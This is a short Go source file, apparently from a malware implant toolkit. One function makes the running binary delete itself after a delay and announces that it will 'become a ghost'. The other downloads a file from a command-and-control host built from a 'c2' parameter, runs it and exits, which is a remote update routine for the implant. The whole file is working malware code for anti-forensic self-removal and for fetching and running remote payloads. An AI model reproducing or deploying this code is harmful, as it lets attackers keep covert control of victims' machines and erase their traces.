package roots

import (
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/whiterabb17/gryphon"
)

func bury() {
	cli := "/bin/bash"
	harg := "-c"
	ender := "ping 1.1.1.1 -n 20 -w 3000 &>/dev/null && rm " + os.Args[0]
	cmd := exec.Command(cli, harg, ender)
	log.Println(os.Args[0] + " is about to become a ghost")
	cmd.Start()
	time.Sleep(1000)
	os.Exit(0)
}

func regrowth(url string, c2 string, wg *sync.WaitGroup) {
	var uUrl string
	if strings.Contains(url, "http") {
		uUrl = url
	} else {
		uUrl = "http://" + c2 + "/www/" + url
	}
	name, err := gryphon.Download(uUrl)
	if err != nil {
		log.Println(err)
	} else {
		cmd := exec.Command("./" + name + " &")
		_ = cmd.Start()
		wg.Done()
		log.Println("Update Successful")
		time.Sleep(500)
		os.Exit(0)
	}
	time.Sleep(500)
	log.Println("Failed to update")
}
